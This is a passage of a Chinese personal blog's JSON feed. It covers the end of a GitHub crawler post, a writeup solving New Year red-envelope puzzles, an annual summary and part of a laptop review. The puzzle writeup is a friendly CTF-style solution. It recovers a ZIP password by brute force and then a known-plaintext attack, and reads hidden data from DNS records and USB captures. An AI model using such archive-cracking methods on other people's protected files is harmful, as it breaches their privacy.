账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 